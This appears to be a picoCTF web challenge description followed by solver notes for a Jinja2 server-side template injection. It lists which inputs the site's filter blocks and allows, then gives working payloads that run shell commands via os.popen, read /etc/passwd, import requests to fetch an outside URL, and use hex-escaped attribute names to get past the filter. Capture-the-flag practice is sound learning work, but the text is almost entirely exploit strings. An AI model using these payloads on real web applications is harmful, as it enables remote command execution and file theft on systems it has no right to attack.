
-----
#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:49496/)!

`{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`

Filter NOT
```
['os'].a
{{{
{{{
{{}}
{{config.__class__.__init__.__globals__[']}}
read
).*
```
Filter CAN
```
{{config}}
{{config.__class__}}
{{config.__class__.__init__}}
{{config.__class__.__init__.__globals__}}
```

{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('requests').get('http://example.com').text }}

{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}